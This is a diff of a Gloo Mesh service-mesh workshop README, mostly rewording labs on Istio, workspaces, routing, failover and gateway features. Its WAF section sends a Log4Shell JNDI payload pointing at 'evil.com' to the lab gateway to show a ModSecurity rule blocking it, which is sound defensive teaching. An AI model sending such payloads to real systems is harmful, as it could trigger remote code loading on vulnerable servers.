@@ -8,13 +8,13 @@
 * [Lab 1 - Deploy Kubernetes clusters](#Lab-1)
 * [Lab 2 - Deploy Gloo Mesh](#Lab-2)
 * [Lab 3 - Deploy Istio](#Lab-3)
-* [Lab 4 - Deploy Online Boutique](#Lab-4)
+* [Lab 4 - Deploy Online Boutique Sample Application](#Lab-4)
 * [Lab 5 - Configure Gloo Mesh Workspaces](#Lab-5)
-* [Lab 6 - Expose the Online Boutique](#Lab-6)
-* [Lab 7 - Zero Trust Networking](#Lab-7)
-* [Lab 8 - Multicluster Routing](#Lab-8)
-* [Lab 9 - Multicluster Failover](#Lab-9)
-* [Lab 10 - API Gateway](#Lab-10)
+* [Lab 6 - Expose the Online Boutique Frontend](#Lab-6)
+* [Lab 7 - Lock it down! Zero Trust Networking](#Lab-7)
+* [Lab 8 - Multi-cluster Routing](#Lab-8)
+* [Lab 9 - Multi-cluster Failover](#Lab-9)
+* [Lab 10 - Gloo Mesh Gateway](#Lab-10)
 
 ## Introduction <a name="introduction"></a>
 
@@ -24,9 +24,9 @@ Gloo Mesh also has features around multi-tenancy, global failover and routing, o
 
 ![Gloo Mesh Value](images/gloo-mesh-value.png)
 
-### Observability & UI
+###  Dashboard & Observability
 
-When you install Gloo Mesh Enterprise, you get the Gloo Mesh UI which allows you to review the health and configuration of Gloo Mesh custom resources, including registered clusters, workspaces, networking, policies, and more.
+When you install Gloo Mesh Enterprise, you get the Gloo Mesh Dashboard which allows you to review the health and configuration of Gloo Mesh custom resources, including registered clusters, workspaces, networking, policies, and more.
 
 ![Gloo Mesh graph](images/gloo-mesh-ui.png)
 
@@ -42,7 +42,7 @@ You can find more information about Gloo Mesh in the official documentation:
 
 ## Begin
 
-To get started with this workshop, checkout this repo.
+To get started with this workshop, clone this repo.
 
 ```sh
 git clone https://github.com/solo-io/solo-cop.git
@@ -52,7 +52,7 @@ cd solo-cop/workshops/gloo-mesh-demo && git checkout v1.0.1
 Set these environment variables which will be used throughout the workshop.
 
 ```sh
-# Used to enable gloo mesh (please ask for a trail key)
+# Used to enable Gloo Mesh (please ask for a trail license key)
 export GLOO_MESH_LICENSE_KEY=<licence_key>
 export GLOO_MESH_VERSION=v2.0.7
 
@@ -82,8 +82,8 @@ Rename the kubectl config contexts of each of your three clusters to `mgmt`, `cl
 ```sh
 # UPDATE <context-to-rename> BEFORE APPLYING
 kubectl config rename-context <context-to-rename> ${MGMT} 
-kubectl config rename-context <context to rename> ${CLUSTER1} 
-kubectl config rename-context <context to rename> ${CLUSTER2}
+kubectl config rename-context <context-to-rename> ${CLUSTER1} 
+kubectl config rename-context <context-to-rename> ${CLUSTER2}
 ``` 
 
 Run the following command to make `mgmt` the current cluster.
@@ -140,7 +140,7 @@ meshctl cluster register \
 
 **Problems?** meshctl tries to automatically detect the management server endpoint, but sometimes this can fail. If that happens, it can be supplied manually. Follow the steps [here](problems-manual-registration.md) if you run into this.
 
-4. Apply the RootTustPolicy to tell the management plane to handle setting up a [shared trust](https://docs.solo.io/gloo-mesh-enterprise/latest/setup/prod/certs/federate-identity/) between the two workload clusters. 
+4. Apply a RootTustPolicy to tell the management plane to handle setting up a [shared trust](https://docs.solo.io/gloo-mesh-enterprise/latest/setup/prod/certs/federate-identity/) between the two workload clusters. Gloo Mesh will create a common root certificate and issues an intermediate signing certificate authority (CA) to each of the remote clusters that contain a common root.
 
 ```yaml
 cat << EOF | kubectl --context ${MGMT} apply -f -
@@ -157,25 +157,18 @@ spec:
 EOF
 ```
 
-The `RootTrustPolicy` custom resource that ensures mTLS connections between the management plane and all remote workload clusters by setting up a certificate chain of trust. In this lab, you set up a root trust policy that creates a common root certificate and issues an intermediate signing certificate authority (CA) to each of the remote clusters that contain a common root.
+Gloo Mesh can also integrate with various vendor technologies, including Vault, AWSCA, and more to ensure the CA meets your company's requirements.
 
-Gloo Mesh also integrates with various vendor technologies, including Vault, AWSCA, and more to ensure the CA meets your company's requirements.
-
-6. Verify proper installation by opening the Gloo Mesh UI by running `meshctl dashboard`. Click [here](problems-dashboard.md) if that command did not work. **Its best to run this command in a separate terminal.**
+6. Verify proper installation by opening the Gloo Mesh Dashboard. Click [here](problems-dashboard.md) if that command did not work. It's best to run this command in a separate terminal.
 
 ```sh
 meshctl dashboard
 ```
 
-After the agents in the remote clusters are registered with the management plane, you can open the Gloo Mesh UI to review details about the remote clusters.
-
-1. From the menu bar, click the **Gloo Mesh UI** tab.
-2. From the **Overview** page in the **Clusters** panel, review the details of your clusters. You can see the Gloo Mesh and Istio version that was installed in the management plane and each of the remote clusters. If you don't, try clicking the **refresh** icon a couple times.
-
 ## Lab 3 - Deploy Istio on the Workload Clusters<a name="Lab-3"></a>
 
 
-1. Install [istioctl](https://istio.io/latest/docs/setup/getting-started/)
+1. Download [istioctl](https://istio.io/latest/docs/setup/getting-started/)
 
 ```sh
 curl -L https://istio.io/downloadIstio | ISTIO_VERSION=${ISTIO_VERSION} sh -
@@ -194,21 +187,21 @@ kubectl create namespace istio-gateways --context $CLUSTER2
 istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER2 -f install/istio/istiooperator-cluster2.yaml
 ```
 
-3. Verify in the Gloo Mesh UI that the deployed Istio information was discovered.
+3. Verify in the Gloo Mesh Dashboard that the deployed Istio information was discovered.
 
 ![istio-installed](images/istio-installed.png)
 
-## Lab 4 - Deploy Online Boutique <a name="Lab-4"></a>
+## Lab 4 - Deploy Online Boutique Sample Application<a name="Lab-4"></a>
 
 ![online-boutique](images/online-boutique.png)
 
-1. Deploy the Online Boutique backend APIs to `cluster1` in the `backend-apis` namespace.
+1. Deploy the Online Boutique backend microservices to `cluster1` in the `backend-apis` namespace.
 
 ```sh
 kubectl apply --context $CLUSTER1 -f install/online-boutique/backend-apis.yaml
 ```
 
-2. Deploy the frontend UI to the `web-ui` namespace in `cluster1`.
+2. Deploy the frontend microservice to the `web-ui` namespace in `cluster1`.
 
 ```sh
 kubectl apply --context $CLUSTER1 -f install/online-boutique/web-ui.yaml
@@ -216,7 +209,7 @@ kubectl apply --context $CLUSTER1 -f install/online-boutique/web-ui.yaml
 
 ## Lab 5 - Configure Gloo Mesh Workspaces <a name="Lab-5"></a>
 
-In this lab, you learn about the Gloo Mesh **Workspaces** feature. Workspaces bring multi-tenancy controls to Istio. With workspaces, you can explore how multiple personas work inside the service mesh independently without conflicting with each other's configuration.
+In this lab, you'll learn about the Gloo Mesh **Workspaces** feature. Workspaces bring multi-tenancy controls to Istio. With workspaces, you can explore how multiple personas can work inside the service mesh independently without conflicting with each others configuration.
 
 Imagine that you have the following teams. Each team represents a "tenant" in Gloo Mesh.
 - The Ops team, who is responsible for the platform and ingress traffic.
@@ -294,7 +287,7 @@ kubectl apply --context $MGMT -f tracks/02-workspaces/workspace-settings-backend
 
 The `WorkspaceSettings` custom resource lets each team define the services and gateways that they want other workspaces from other teams to be able to access. This way, you can control the discovery of services in your service mesh and enable each team to access only what they need.
 
-Each workspace can have only one workspace settings resource.
+Each workspace can have only one WorkspaceSettings resource.
 
 ## Lab 6 - Expose the Online Boutique <a name="Lab-6"></a>
 
@@ -377,7 +370,7 @@ echo "Online Boutique available at http://$HTTP_GATEWAY_ENDPOINT"
 
 ## Lab 7 - Zero Trust Networking <a name="Lab-7"></a>
 
-The backend APIs team employs a "Zero Trust" networking approach by enforcing service isolation. With service isolation, all inbound traffic to their applications is denied, even within their own namespace.
+The backend APIs team employs a "Zero Trust" networking approach by enforcing service isolation. With service isolation, all inbound traffic to their applications is denied by default, even within their own namespace.
 
 1. Add a default deny-all policy to the backend-apis namespace
 
@@ -395,7 +388,7 @@ EOF
 
 2. Refresh the Online Boutique webpage. You should see an error with message "RBAC: access denied"
 
-3. Add AccessPolicies to explicitly allow traffic from the frontend to the backend apis
+3. Add AccessPolicies to explicitly allow traffic between the microservices in the backend-apis namespace and also from web-team workspace to the backend-apis-team workspace. As you can see, these policies can be very flexible.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -437,7 +430,7 @@ EOF
 
 ![Without Checkout Feature](images/checkout-feature-error.png)
 
-This is because checkout microservice is not deploy yet! `kubectl get deployments -n backend-apis --context $CLUSTER1`
+This is because checkout microservice is not deploy yet! See `kubectl get deployments -n backend-apis --context $CLUSTER1`
 
 ## Lab 8 - Multi Cluster Routing <a name="Lab-8"></a>
 
@@ -495,13 +488,13 @@ In this lab, you learn how Gloo Mesh orchestrates failover with simple and decla
 
 ![Multicluster Failover](images/multicluster-failover-banner.png)
 
-1. Deploy the frontend application to `cluster2`
+1. Deploy the frontend application to `cluster2` as well.
 
 ```sh
 kubectl apply --context $CLUSTER2 -f install/online-boutique/web-ui-cluster2.yaml
 ```
 
-In order to see the full power of Gloo Mesh failover policies, make sure that the frontend application is available on both clusters. To do so, create a resource called a `VirtualDestination`. The `VirtualDestination` is a Gloo Mesh resource that enables routing across clusters by defining a multicluster hostname for your service.
+In order to see the full power of Gloo Mesh failover policies, make sure that the frontend application is available on both clusters. To do so, create a `VirtualDestination` for frontend as well.
 
 2. Create VirtualDestination for frontend application
 
@@ -532,7 +525,7 @@ EOF
 kubectl --context ${MGMT} apply -f tracks/05-failover/backend-apis-virtual-destinations.yaml
 ```
 
-4. Update the RouteTable so the VirtualGateway will route to both frontend applications
+4. Update the RouteTable so the VirtualGateway will route to both frontend applications. This can be accomplished by simply routing to the frontend's VirtualDestination.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -569,7 +562,7 @@ Review the following update to the `RouteTable` resource. You must configure the
    * The route table selects the ingress gateway to use. This gateway is in a workspace that the route table's workspace exports to.
    * The `frontend` route is set up to forward to destinations of the kind `VIRTUAL_DESTINATION`. It selects the virtual destination that you created by name and namespace.
 
-5. Test routing between frontend services
+5. Test routing between frontend services by refreshing your Online Boutique webpage several times. You should see both cluster1 and cluster2.
 
 * cluster1 header
 ![cluster1 header](images/cluster1-frontend-header.png)
@@ -612,7 +605,7 @@ EOF
    * The policy applies to destinations of the kind `VIRTUAL_DESTINATION`. It selects the virtual destination that you created by label.
    * The policy configures locality mapping. Requests from the us-east-1 region are mapped to us-west-2, and vice versa. This way, if a request cannot be fulfilled by an app in that region first, it is sent to the next closest region.
 
-7. The failover policy tells Gloo Mesh _where_ to reroute failover traffic. But, you also need to tell Gloo Mesh _when_. To do so, create an outlier detection policy. This policy sets up several conditions, such as retries and ejection percentages, for Gloo Mesh to use before failing over traffic.
+7. The failover policy tells Gloo Mesh _where_ to re-route failover traffic. But, you also need to tell Gloo Mesh _when_. To do so, create an outlier detection policy. This policy sets up several conditions, such as retries and ejection percentages, for Gloo Mesh to use before failing over traffic.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -638,29 +631,21 @@ EOF
    * `maxEjectionPercent`: The percentage of traffic to fail over.
    * `baseEjectionTime`: The timeout to use to try to route back to the local service, after Kubernetes detects the service is healthy again.
 
-8. Make it so that the frontend application in cluster1 cannot respond to requests.
+8. Purposefully break the frontend microservice on cluster1 so that it cannot respond to requests. This command tells the container to sleep.
 
 ```sh
 kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"template":{"spec":{"containers":[{"name":"server","command":["sleep","20h"],"readinessProbe":null,"livenessProbe":null}]}}}}'
 ```
 
-9. Test failover to cluster2 frontend application
-
-* Optionally view the cluster failover using curl
-
-```sh
-for i in {1..6}; do curl -sSk http://$HTTP_GATEWAY_ENDPOINT | grep "Cluster Name:"; done
-```
+9. Test failover to cluster2 frontend application by refreshing your Online Boutique webpage several times. You should always see cluster2.
 
 10. Fix frontend in cluster1
 
 ```sh
 kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"template":{"spec":{"containers":[{"name":"server","command":[],"readinessProbe":null,"livenessProbe":null}]}}}}'
-sleep 5
-kubectl wait pod -l app=frontend -n web-ui --context $CLUSTER1 --for condition=ready
 ```
 
-11. Test that the frontend in cluster1 is working again
+11. Wait a few seconds and test that the frontend in cluster1 is working again.
 
 ## Lab 10 - API Gateway <a name="Lab-10"></a>
 
@@ -669,7 +654,7 @@ Gloo Mesh Gateway adds API gateway features directly into the Istio ingress gate
 
 In this lab, you explore just a few of these features to see how powerful adding Gloo Mesh Gateway to your service mesh is.
 
-In order to use the various features of the Gloo API gateway you will need to deploy the `Gloo Mesh Addons` package which has the components to use features such as `rate limiting` and `external authorization`.
+In order to use the various features of the Gloo Mesh gateway you will need to deploy the `Gloo Mesh Addons` package which has the components to use features such as `rate limiting` and `external authorization`.
 
 1. Install the `gloo-mesh-addons` package in cluster1
 
@@ -695,29 +680,24 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
 kubectl apply -f tracks/06-api-gateway/workspace-settings.yaml --context $MGMT
 ```
 
-### 1. Add a web application firewall (WAF)
+#### Web Application Firewall (WAF)
 
 Gloo Mesh Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
 
 In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
 
-**Before you begin**
-
 1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
-
 ![log4j exploit](./images/log4j_attack.png)
-2. Confirm that a bad JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
+
+2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
 curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
 ```
 
-**WAF policy**
-With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity.
+3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
 
-3. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
-
-  * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same lable.
+  * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same label.
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
@@ -738,7 +718,7 @@ spec:
   http:
     - name: frontend
       labels:
-        waf: "true"
+        waf: "true" ##### NOTE
       forwardTo:
         destinations:
           - ref:
@@ -757,7 +737,7 @@ spec:
   applyToRoutes:
   - route:
       labels:
-        waf: "true"
+        waf: "true" ##### NOTE
   config:
     disableCoreRuleSet: true
     customInterventionMessage: 'Log4Shell malicious payload'
@@ -771,13 +751,13 @@ spec:
 EOF
 ```
 
-4. Try the request again.
+4. Try the previous request again.
 
 ```sh
 curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
 ```
 
-Note that the is now blocked with the custom intervention message from the WAF policy.
+Note that the request is now blocked with the custom intervention message from the WAF policy.
 
 ```sh
 HTTP/2 403
@@ -792,11 +772,11 @@ Log4Shell malicious payload
 Your frontend app is no longer susceptible to `log4j` attacks, nice!
 
 
-### 2. External Authorization (OIDC)
+#### External Authorization (OIDC)
 
-Another valuable feature of API gateways is integration into your IdP (Identity Provider).  In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
+Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
 
-1. In order for OIDC to work we need to enable HTTPS on our gateway. To do so we need to create and upload a self-signed certificate
+1. In order for OIDC to work we need to enable HTTPS on our gateway. For this demo, we will create and upload a self-signed certificate which will be used in the gateway for TLS termination.
 
 ```sh
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
@@ -836,7 +816,7 @@ spec:
         number: 443
       tls:
         mode: SIMPLE
-        secretName: tls-secret
+        secretName: tls-secret # NOTE
       allowedRouteTables:
         - host: '*'
           selector:
@@ -844,7 +824,7 @@ spec:
 EOF
 ```
 
-3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser)
+3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser. Chrome: Advanced -> Proceed)
 
 ```sh
 export ENDPOINT_HTTPS_GW_CLUSTER1_EXT=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
